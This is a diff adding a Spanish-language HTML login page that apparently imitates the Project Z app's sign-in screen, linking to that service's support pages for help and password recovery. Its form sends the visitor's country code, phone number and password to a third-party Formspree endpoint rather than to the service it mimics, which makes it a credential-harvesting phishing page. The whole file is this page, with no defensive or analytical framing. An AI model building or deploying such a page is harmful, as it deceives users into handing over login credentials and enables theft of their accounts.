@@ -1,0 +1,76 @@
+ 
+<html lang="en">
+<head>
+      <link rel="icon" type="image/png" href="https://files.catbox.moe/p1iphl.png">  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" />
+   <script src="https://kit.fontawesome.com/your-font-awesome-kit.js" crossorigin="anonymous"></script>
+
+</head>
+<body>
+<div class="texto">
+      <h1>Inicia secion</h1>
+      </div>
+<div class="texto-help">
+     <h3><a href="https://support.projz.com/en/support/solutions" target="_blank">Ayuda</a></h3>
+      </div>
+  
+
+
+
+
+<button class="circle-button" id="redirectToPage"><i class="fas fa-arrow-left"></i></button>
+
+
+  
+  
+  
+<form
+  action="https://formspree.io/f/xvoerapo"
+  method="POST"
+>
+  <label>
+   
+<div class="phone-input-container">
+    
+   <select name="country_code" class="custom-select" id="countryCodeSelect">
+    <option value="+52">+52</option>
+    <option value="+51">+51</option>
+    <option value="+1">+1</option>
+    <option value="+44">+44</option>
+    <option value="+33">+33</option>
+    <option value="+49">+49</option>
+    <option value="+81">+81</option>
+    <option value="+86">+86</option>
+    <option value="+7">+7</option>
+    <option value="+91">+91</option>
+    <option value="+64">+64 </option>
+    <option value="+31">+31 </option>
+    <option value="+46">+46 </option>
+    <option value="+41">+41 </option>
+    <option value="+54">+54</option>
+    <option value="+971">+971 </option>
+    <option value="+966">+966 </option>
+    <option value="+966">+966 </option>
+        <!-- Agrega más opciones para otros países aquí -->
+    </select>
+  <input type="text" name="phone_number" class="custom-input" placeholder="Número de Teléfono">
+</div>
+
+
+
+  </label>
+  <label>
+
+   <input type="password" name="password" id="passwordInput" class="custom-input" placeholder="Contraseña">
+
+    
+  </label>
+  <!-- your other form fields go here -->
+<button type="submit" class="custom-button"><h2>Iniciar Sesión</h2></button>
+</form>
+  
+   <h3><a href="https://support.projz.com/en/support/solutions" class="custom-link">Olvidaste la contraseña?</a></h3>
+</body>
+</html>
